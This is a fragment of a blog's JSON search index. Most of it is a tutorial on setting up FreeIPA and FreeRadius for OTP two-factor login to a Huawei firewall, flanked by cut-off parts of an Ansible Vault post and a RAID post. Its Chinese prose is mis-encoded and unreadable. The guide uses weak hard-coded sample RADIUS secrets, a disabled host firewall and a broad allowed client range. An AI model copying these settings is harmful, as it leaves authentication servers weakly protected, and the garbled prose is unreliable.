class=\"l\"\u003epass.yml\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evars\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eansible_ssh_pass\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;{{ ansible_ssh_pass }}\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etasks\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emkdirs\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003efile\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003epath=\u0026#34;{{ item }}\u0026#34; state=directory\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ewith_items\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"s2\"\u003e\u0026#34;OS.05\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"s2\"\u003e\u0026#34;OS.06\u0026#34;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæŠŠå¯†æ–‡æ”¾è¿› pass.yml æ–‡ä»¶\u003c/p\u003e","title":"ansible vaultåŠ å¯†çš„ä½¿ç”¨"},{"content":"å®¡è®¡å•Šå®¡è®¡ï¼Œå…¬å¸ä½¿ç”¨çš„åä¸ºé˜²ç«å¢™éœ€è¦é…ç½®åŒå› å­ç™»å½•è®¤è¯ï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚\næŸ¥äº†ä¸€ä¸‹åä¸ºæ‰‹å†Œï¼Œæ”¯æŒ Radius è®¤è¯ï¼Œé‚£ä¹ˆæ²¡åŠæ³•ï¼Œæœ€çœé’±çš„åŠæ³•å°±æ˜¯ç”¨ FreeIPA å’Œ FreeRadius æ­ä¸€å¥— OTP åŒå› å­è®¤è¯äº†ã€‚\nç³»ç»Ÿæ˜¯ CentOS 7 ï¼Œå·²å…³é—­é˜²ç«å¢™æœåŠ¡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€æ­å»ºFreeIPA é¦–å…ˆè®¾ç½® hostname\nhostnamectl set-hostname freeipa.rendoumi.local echo \u0026#34;192.168.1.5 freeipa.rendoumi.local\u0026#34; \u0026gt;\u0026gt; /etc/hosts ç„¶åå®‰è£… FreeIPAï¼Œæ³¨æ„è¦å›ç­”çš„å‡ ä¸ªé—®é¢˜\nä¸è£…bindï¼Œæ— è®ºæ˜¯ dnsmasq æˆ– corednsï¼Œéƒ½æ¯” bind è½»ï¼Œè¦è£…ä¹Ÿè£…é‚£ä¸¤ä¸ªã€‚ server hostname æ˜¯ freeipa.rendoumi.local domian name æ˜¯ rendoumi.local realm name æ˜¯å¤§å†™çš„ RENDOUMI.LOCAL æœ‰ä¸¤ä¸ªå¯†ç ï¼Œç¬¬ä¸€ä¸ªæ˜¯ LDAP çš„å¯†ç ï¼Œç¬¬äºŒä¸ªæ˜¯ IPA çš„å¯†ç  yum -y install deltarpm yum update yum -y install freeipa-server sysctl net.ipv6.conf.all.disable_ipv6=0 ipa-server-install This program will set up the IPA Server. This includes: * Configure a stand-alone CA (dogtag) for certificate management * Configure the Network Time Daemon (ntpd) * Create and configure an instance of Directory Server * Create and configure a Kerberos Key Distribution Center (KDC) * Configure Apache (httpd) To accept the default shown in brackets, press the Enter key. WARNING: conflicting time\u0026amp;date synchronization service \u0026#39;chronyd\u0026#39; will be disabled in favor of ntpd Do you want to configure integrated DNS (BIND)? [no]:no Server host name [freeipa.rendoumi.local]: Please confirm the domain name [rendoumi.local]: Please provide a realm name [RENDOUMI.LOCAL]: Directory Manager password: Password (confirm): ... IPA admin password: Password (confirm): The IPA Master Server will be configured with: Hostname: freeipa.rendoumi.local IP address(es): 192.168.1.5 Domain name: rendoumi.local Realm name: RENDOUMI.LOCAL Continue to configure the system with these values? [no]: yes The following operations may take some minutes to complete. Please wait until the prompt is returned. Configuring NTP daemon (ntpd) ... Setup complete Next steps: 1. You must make sure these network ports are open: TCP Ports: * 80, 443: HTTP/HTTPS * 389, 636: LDAP/LDAPS * 88, 464: kerberos UDP Ports: * 88, 464: kerberos * 123: ntp 2. You can now obtain a kerberos ticket using the command: \u0026#39;kinit admin\u0026#39; This ticket will allow you to use the IPA tools (e.g., ipa user-add) and the web user interface. Be sure to back up the CA certificate stored in /root/cacert.p12 This file is required to create replicas. The password for this file is the Directory Manager password ä»¥ä¸Šï¼Œå°±è£…å¥½äº† FreeIPAï¼Œé…ç½®æ–‡ä»¶åœ¨ /etc/ipa/default.conf\néªŒè¯ä¸€ä¸‹ï¼š\n# è¾“å…¥ipaå¯†ç  kinit admin klist ipactl status # sn è¾“å…¥ 01 ipa cert-show ç™»å½•ï¼š http://freeipa.rendoumi.comï¼Œï¼ˆæ³¨æ„ä½ è®¿é—®çš„æœºå™¨å¿…é¡»èƒ½è§£æåˆ°è¿™ä¸ªåŸŸåï¼‰ç”¨æˆ·å admin ï¼Œå¯†ç æ˜¯ä¸Šé¢å¡«å…¥çš„ ipa å¯†ç ï¼Œå»ºç«‹ä¸€ä¸ªæ–°ç”¨æˆ·\nç„¶åç»™è¿™ä¸ªç”¨æˆ·æ·»åŠ  OTP Tokenï¼š\nç¼ºçœä»€ä¹ˆéƒ½ä¸ç”¨å¡«ï¼Œç›´æ¥é€‰ Addï¼š\nä¼šè¹¦å‡ºæ¥ä¸€ä¸ªäºŒç»´ç ï¼Œå»ºè®®æ˜¯ç”¨ FreeOTP æ‰«æï¼š\næˆ‘ä»¬åœ¨æ‰‹æœºä¸Šè£…ä¸Š FreeOTP è½¯ä»¶ï¼Œæ‰«ææ·»åŠ ï¼š\nè¿™æ ·å°±okäº†ã€‚ä¸‹æ¬¡ç™»å½•çš„æ—¶å€™å¯†ç å°±æ˜¯é¢„è®¾å¯†ç +FreeOTPå¯†ç åˆåœ¨ä¸€èµ·ã€‚ä¸­é—´æ²¡æœ‰åŠ å·å“¦\næ¯”å¦‚é¢„è®¾å¯†ç æ˜¯ Fuckï¼Œotpå¯†ç æ˜¯762405ï¼Œåˆåœ¨ä¸€èµ·å°±æ˜¯ Fuck762405ï¼Œä¸€èµ·è¾“å…¥å³å¯ã€‚\né‚£ FreeIPA çš„éƒ¨åˆ†å°±å®Œæˆäº†ã€‚\näºŒã€æ­å»ºFreeRadius ä¸Šé¢çš„éƒ¨åˆ†å…¶å®æ˜¯ FreeIPA å……å½“äº†ç”¨æˆ·æ•°æ®åº“ï¼Œç”¨ LDAP å­˜æ”¾æ•°æ®ï¼Œè€Œ Radius éœ€è¦ä» IPA æ‹¿åˆ°ç”¨æˆ·ä¿¡æ¯ã€‚\nå®‰è£…ï¼š\nyum -y install freeradius freeradius-utils freeradius-ldap freeradius-krb5 Radius çš„é…ç½®éƒ½åœ¨ /etc/raddb ç›®å½•ä¸‹ï¼š\nç¼–è¾‘ /etc/raddb/client.conf ï¼Œå¢åŠ ä¸€ä¸ªç½‘æ®µçš„è®¤è¯ï¼Œå…è®¸ 172.0.0.0/8 è®¿é—®\nclient localnet { ipaddr = 172.0.0.0/8 proto = * secret = Fuck2021 nas_type = other limit { max_connections = 16 lifetime = 0 idle_timeout = 30 } } åŒæ—¶ä¿®æ”¹ä¸‹é¢çš„ clinet localhost éƒ¨åˆ†ï¼Œä¿®æ”¹ secretï¼Œä¹‹åæˆ‘ä»¬è¦ä»æœ¬åœ°ç™»å½•åšæµ‹è¯•\nclient localhost { secret = ChinaBank2021 å†ä¿®æ”¹ /etc/raddb/sites-enabled/default and /etc/raddb/sites-enabled/inner-tunnel ï¼Œæ”¯æŒ LDAPï¼Œæœ‰äºŒå¤„åœ°æ–¹\næŠŠ\n# # The ldap module reads passwords from the LDAP database. -ldap æ¢æˆï¼š\n# # The ldap module reads passwords from the LDAP database. ldap if ((ok || updated) \u0026amp;\u0026amp; User-Password) { update { control:Auth-Type := ldap } } æŠŠ\n# Auth-Type LDAP { # ldap # } æ¢æˆï¼š\nAuth-Type LDAP { ldap } ç„¶å ldap æ¨¡å—é…ç½®ä¸€ä¸‹\nln -s /etc/raddb/mods-available/ldap /etc/raddb/mods-enabled/ æˆ‘ä»¬å…ˆç”¨ ldapsearch æœç´¢ä¸€ä¸‹ï¼Œçœ‹çœ‹å…·ä½“çš„ dn ä¿¡æ¯ï¼Œè¿™é‡Œè¾“å…¥ä¹‹å‰è®¾ç½®çš„ ldap å¯†ç \nldapsearch -x -v -W -D \u0026#39;cn=Directory Manager\u0026#39; uid=test|grep test ldap_initialize( \u0026lt;DEFAULT\u0026gt; ) Enter LDAP Password: filter: uid=test requesting: All userApplication attributes memberOf: cn=test,cn=groups,cn=accounts,dc=rendoumi,dc=local å¾—åˆ° cn=accounts,dc=rendoumi,dc=local\nå†å»ä¿®æ”¹ /etc/raddb/mods-enabled/ldap æ–‡ä»¶ï¼Œä¿®æ”¹ server å’Œ base_dn ä¸ä¹‹å¯¹åº”ï¼š\nserver = \u0026#39;freeipa.rendoumi.local\u0026#39; base_dn = \u0026#39;cn=accounts,dc=rendoumi,dc=local\u0026#39; æ³¨æ„ï¼Œä¸Šé¢æˆ‘ä»¬æ²¡è£… bindï¼Œæ‰€ä»¥å¿…é¡»åœ¨ /etc/hosts å­˜åœ¨è®°å½•ï¼Œå¦åˆ™æœ¬åœ°å°±è®¿é—®ä¸åˆ°äº†\nå¯åŠ¨ radiusd çš„è°ƒè¯•æ¨¡å¼ï¼š\nradiusd â€“X ... Listening on auth address * port 1812 as server default Listening on acct address * port 1813 as server default Listening on auth address :: port 1812 as server default Listening on acct address :: port 1813 as server default Listening on auth address 127.0.0.1 port 18120 as server inner-tunnel Opening new proxy socket \u0026#39;proxy address * port 0\u0026#39; Listening on proxy address * port 36752 Ready to process requests å†å¼€ä¸€ä¸ªç»ˆç«¯æµ‹è¯•ä¸€ä¸‹ï¼Œæ³¨æ„ï¼Œæˆ‘ä»¬æ˜¯ä»æœ¬åœ°(127.0.0.1)å‘èµ·æµ‹è¯•çš„ï¼Œæ‰€ä»¥å¯¹åº”è¦ç”¨åˆ°ä¸Šé¢è®¾ç½®çš„ secretï¼Œç”¨ admin ç™»å½•ï¼Œå°±é¿å…è¦ç”¨åˆ° freeotp çš„å£ä»¤ï¼Œè¿™é‡Œ xxxxxxxx æ˜¯ admin çš„å¯†ç ï¼š\nradtest admin xxxxxxxx freeipa.rendoumi.local 1812 ChinaBank2021 Sent Access-Request Id 57 from 0.0.0.0:45247 to 172.18.31.41:1812 length 75 User-Name = \u0026#34;admin\u0026#34; User-Password = \u0026#34;xxxxxxxx\u0026#34; NAS-IP-Address = 172.18.31.41 NAS-Port = 1812 Message-Authenticator = 0x00 Cleartext-Password = \u0026#34;xxxxxxxx\u0026#34; Received Access-Accept Id 57 from 172.18.31.41:1812 to 0.0.0.0:0 length 20 çœ‹åˆ°ä¸Šé¢ Access-Accept å°±okäº†ï¼Œctrl-c ç»ˆæ­¢ radiusd çš„è¿è¡Œï¼Œå¼€å¯ radiusd æœåŠ¡ã€‚\nsystemctl enable --now radiusd ç„¶ååœ¨åä¸ºé˜²ç«å¢™è®¾ç½®è¿™ä¸ª radiusd æœåŠ¡å™¨å°±å¯ä»¥äº†ã€‚\nå‚è€ƒèµ„æ–™ï¼š\nhttps://www.freeipa.org/page/Using_FreeIPA_and_FreeRadius_as_a_RADIUS_based_software_token_OTP_system_with_CentOS/RedHat_7\n","permalink":"https://rendoumi.com/posts/20211123-freeipa_freeradius/","summary":"\u003cp\u003eå®¡è®¡å•Šå®¡è®¡ï¼Œå…¬å¸ä½¿ç”¨çš„åä¸ºé˜²ç«å¢™éœ€è¦é…ç½®åŒå› å­ç™»å½•è®¤è¯ï¼Œè¿™ä¸‹éº»çƒ¦äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæŸ¥äº†ä¸€ä¸‹åä¸ºæ‰‹å†Œï¼Œæ”¯æŒ Radius è®¤è¯ï¼Œé‚£ä¹ˆæ²¡åŠæ³•ï¼Œæœ€çœé’±çš„åŠæ³•å°±æ˜¯ç”¨ FreeIPA å’Œ FreeRadius æ­ä¸€å¥— OTP åŒå› å­è®¤è¯äº†ã€‚\u003c/p\u003e\n\u003cp\u003eç³»ç»Ÿæ˜¯ CentOS 7 ï¼Œå·²å…³é—­é˜²ç«å¢™æœåŠ¡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch2 id=\"ä¸€æ­å»ºfreeipa\"\u003eä¸€ã€æ­å»ºFreeIPA\u003c/h2\u003e\n\u003cp\u003eé¦–å…ˆè®¾ç½® hostname\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehostnamectl set-hostname freeipa.rendoumi.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;192.168.1.5 freeipa.rendoumi.local\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /etc/hosts\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå®‰è£… FreeIPAï¼Œæ³¨æ„è¦å›ç­”çš„å‡ ä¸ªé—®é¢˜\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eä¸è£…bindï¼Œæ— è®ºæ˜¯ dnsmasq æˆ– corednsï¼Œéƒ½æ¯” bind è½»ï¼Œè¦è£…ä¹Ÿè£…é‚£ä¸¤ä¸ªã€‚\u003c/li\u003e\n\u003cli\u003eserver hostname æ˜¯ freeipa.rendoumi.local\u003c/li\u003e\n\u003cli\u003edomian name æ˜¯ rendoumi.local\u003c/li\u003e\n\u003cli\u003erealm name æ˜¯å¤§å†™çš„ RENDOUMI.LOCAL\u003c/li\u003e\n\u003cli\u003eæœ‰ä¸¤ä¸ªå¯†ç ï¼Œç¬¬ä¸€ä¸ªæ˜¯ LDAP çš„å¯†ç ï¼Œç¬¬äºŒä¸ªæ˜¯ IPA çš„å¯†ç \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install deltarpm\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum update\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install freeipa-server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esysctl net.ipv6.conf.all.disable_ipv6\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eipa-server-install\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis program will \u003cspan class=\"nb\"\u003eset\u003c/span\u003e up the IPA Server.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis includes:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Configure a stand-alone CA \u003cspan class=\"o\"\u003e(\u003c/span\u003edogtag\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003efor\u003c/span\u003e certificate management\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Configure the Network Time Daemon \u003cspan class=\"o\"\u003e(\u003c/span\u003entpd\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Create and configure an instance of Directory Server\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Create and configure a Kerberos Key Distribution Center \u003cspan class=\"o\"\u003e(\u003c/span\u003eKDC\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  * Configure Apache \u003cspan class=\"o\"\u003e(\u003c/span\u003ehttpd\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTo accept the default shown in brackets, press the Enter key.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eWARNING: conflicting time\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003edate synchronization service \u003cspan class=\"s1\"\u003e\u0026#39;chronyd\u0026#39;\u003c/span\u003e will be disabled in favor of ntpd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDo you want to configure integrated DNS \u003cspan class=\"o\"\u003e(\u003c/span\u003eBIND\u003cspan class=\"o\"\u003e)\u003c/span\u003e? \u003cspan class=\"o\"\u003e[\u003c/span\u003eno\u003cspan class=\"o\"\u003e]\u003c/span\u003e:no\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eServer host name \u003cspan class=\"o\"\u003e[\u003c/span\u003efreeipa.rendoumi.local\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePlease confirm the domain name \u003cspan class=\"o\"\u003e[\u003c/span\u003erendoumi.local\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePlease provide a realm name \u003cspan class=\"o\"\u003e[\u003c/span\u003eRENDOUMI.LOCAL\u003cspan class=\"o\"\u003e]\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDirectory Manager password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword \u003cspan class=\"o\"\u003e(\u003c/span\u003econfirm\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIPA admin password:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePassword \u003cspan class=\"o\"\u003e(\u003c/span\u003econfirm\u003cspan class=\"o\"\u003e)\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThe IPA Master Server will be configured with:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHostname:       freeipa.rendoumi.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eIP address\u003cspan class=\"o\"\u003e(\u003c/span\u003ees\u003cspan class=\"o\"\u003e)\u003c/span\u003e: 192.168.1.5\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDomain name:    rendoumi.local\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eRealm name:     RENDOUMI.LOCAL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eContinue to configure the system with these values? \u003cspan class=\"o\"\u003e[\u003c/span\u003eno\u003cspan class=\"o\"\u003e]\u003c/span\u003e: yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThe following operations may take some minutes to complete.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePlease \u003cspan class=\"nb\"\u003ewait\u003c/span\u003e \u003cspan class=\"k\"\u003euntil\u003c/span\u003e the prompt is returned.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eConfiguring NTP daemon \u003cspan class=\"o\"\u003e(\u003c/span\u003entpd\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSetup \u003cspan class=\"nb\"\u003ecomplete\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNext steps:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        1. You must make sure these network ports are open:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                TCP Ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 80, 443: HTTP/HTTPS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 389, 636: LDAP/LDAPS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 88, 464: kerberos\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                UDP Ports:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 88, 464: kerberos\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                  * 123: ntp\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        2. You can now obtain a kerberos ticket using the command: \u003cspan class=\"s1\"\u003e\u0026#39;kinit admin\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           This ticket will allow you to use the IPA tools \u003cspan class=\"o\"\u003e(\u003c/span\u003ee.g., ipa user-add\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e           and the web user interface.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eBe sure to back up the CA certificate stored in /root/cacert.p12\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eThis file is required to create replicas. The password \u003cspan class=\"k\"\u003efor\u003c/span\u003e this file is the Directory Manager password\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥ä¸Šï¼Œå°±è£…å¥½äº† FreeIPAï¼Œé…ç½®æ–‡ä»¶åœ¨ /etc/ipa/default.conf\u003c/p\u003e","title":"ä½¿ç”¨FreeIPAå’ŒFreeRadiusæ­å»ºåŒå› å­è®¤è¯æœåŠ¡å™¨"},{"content":"è¿™ä¸ªæ¯”è¾ƒæœ‰æ„æ€ï¼ŒåŒäº‹è¦å­˜æ”¾ 2TB çš„æ•°æ®ï¼Œä½†æ˜¯ç³»ç»Ÿæ˜¯ 1.7TB çš„ 4 å— 600G ç›˜ç»„æˆçš„ Raid10ã€‚\nå¾ˆæ˜æ˜¾ç›˜ç©ºé—´ä¸å¤Ÿäº†ï¼Œå»åº“æˆ¿æ‰¾ä¸¤å— 10TB çš„å¤§ç›˜ç»„æˆ Raid1 ç»™ä»–ç”¨å¥½äº†ã€‚\né—®é¢˜æ¥äº†ï¼Œç³»ç»Ÿæ˜¯ KVM è™šæœºï¼Œæ€æ ·æŠŠè¿™ä¸ª 10TB 